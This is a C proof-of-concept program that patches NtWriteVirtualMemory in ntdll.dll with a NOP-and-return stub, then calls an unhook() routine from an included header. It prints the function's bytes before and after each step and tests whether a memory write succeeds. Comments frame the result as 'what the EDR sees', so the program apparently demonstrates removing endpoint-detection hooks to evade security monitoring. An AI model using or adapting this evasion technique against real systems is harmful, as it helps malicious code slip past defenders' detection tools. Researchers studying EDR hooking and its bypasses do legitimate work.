#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include "iat.h"

int main(){
    const char patch[8]="\x90\x90\x90\x90\x90\x90\xc3";
    size_t jonk = 0;
    //sample hook
    void* ntwvm = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    printf("Original NtWriteVirtualMemory:\n");
    for(int i=0;i<10;i++) printf("\\x%02x", ((unsigned char*)ntwvm)[i]);
    printf("\n");

    WriteProcessMemory(GetCurrentProcess(), ntwvm, patch, 7, &jonk);
    printf("patched\n\n");
    char jonklr = 'j';
    char tojonk = 'k';
    WriteProcessMemory(GetCurrentProcess(), &jonklr, &tojonk, 1, &jonk);
    printf("Byte (unchanged): %c\nPatched NtWriteVirtualMemory:\n", jonklr);
    for(int i=0;i<10;i++) printf("\\x%02x", ((unsigned char*)ntwvm)[i]);
    printf("\n\n");

    unhook();
    printf("unhooked\n");
    WriteProcessMemory(GetCurrentProcess(), &jonklr, &tojonk, 1, &jonk);
    printf("Byte (changed): %c\nUnhooked NtWriteVirtualMemory - what the EDR sees:\n", jonklr);
    for(int i=0;i<10;i++) printf("\\x%02x", ((unsigned char*)ntwvm)[i]);
    printf("\n");
    getchar();
    return 0;
}
